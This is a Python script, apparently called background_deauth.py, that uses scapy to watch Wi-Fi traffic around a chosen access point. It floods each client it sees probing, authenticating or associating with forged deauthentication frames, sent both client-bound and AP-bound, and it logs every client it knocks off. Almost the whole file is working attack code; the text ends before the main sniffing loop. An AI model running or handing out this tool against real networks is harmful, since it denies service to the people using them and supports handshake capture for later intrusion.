#!/usr/bin/env python3

import sys, time, os, subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11ProbeReq, Dot11Auth, Dot11AssoReq
from datetime import datetime

# Validate arguments
if len(sys.argv) != 5:
    print("Usage: python3 background_deauth.py <iface> <bssid> <channel> <logfile>")
    sys.exit(1)

iface, bssid, channel, logfile = sys.argv[1:5]

# Enhanced Configuration
whitelist = ["00:11:22:33:44:55"]  # Add your MAC if needed
clients_seen = set()
active_clients = set()

# Band-specific timing
BAND = '2.4' if int(channel) <= 14 else '5'
deauth_count = 7 if BAND == '2.4' else 5       # More packets for 2.4GHz
deauth_interval = 0.1 if BAND == '2.4' else 0.15 # Slightly slower for 5GHz
scan_interval = 3
sniff_timeout = 2

# Ensure log directory exists
os.makedirs(os.path.dirname(logfile), exist_ok=True)

def log_client(mac, reason=""):
    """Enhanced logging with band info and reason"""
    if mac not in clients_seen:
        clients_seen.add(mac)
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        log_entry = f"{timestamp} Deauth to {mac} on {BAND}GHz"
        if reason:
            log_entry += f" ({reason})"
        try:
            with open(logfile, "a") as f:
                f.write(log_entry + "\n")
        except IOError as e:
            print(f"[!] Log error: {e}")

def deauth(mac, reason=""):
    """Enhanced deauth with band optimization"""
    try:
        # Dual deauth packets (client+AP targeted)
        pkt1 = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Deauth()
        
        # Band-specific power adjustments
        if BAND == '5':
            sendp([pkt1, pkt2], iface=iface, count=deauth_count, 
                 inter=deauth_interval, verbose=0)
        else:  # 2.4GHz
            sendp([pkt1, pkt2], iface=iface, count=deauth_count, 
                 inter=deauth_interval, verbose=0)
        
        log_client(mac, reason)
        print(f"[+] Deauthed {mac} on {BAND}GHz")
    except Exception as e:
        print(f"[!] Deauth failed for {mac}: {str(e)}")

def packet_handler(pkt):
    """Enhanced client detection with packet type analysis"""
    if pkt.haslayer(Dot11):
        # Detect various packet types
        if pkt.haslayer(Dot11ProbeReq):
            src = pkt.addr2
            if src and src != bssid and src not in whitelist:
                active_clients.add(src)
                deauth(src, "ProbeReq")
        
        elif pkt.haslayer(Dot11Auth):
            src = pkt.addr2
            if src and src != bssid and src not in whitelist:
                active_clients.add(src)
                deauth(src, "Auth")
        
        elif pkt.haslayer(Dot11AssoReq):
            src = pkt.addr2
            if src and src != bssid and src not in whitelist:
                active_clients.add(src)
                deauth(src, "AssoReq")
        
        # General MAC detection
        if pkt.addr1 and pkt.addr1 != bssid and pkt.addr1 not in whitelist:
            active_clients.add(pkt.addr1)
        if pkt.addr2 and pkt.addr2 != bssid and pkt.addr2 not in whitelist:
            active_clients.add(pkt.addr2)

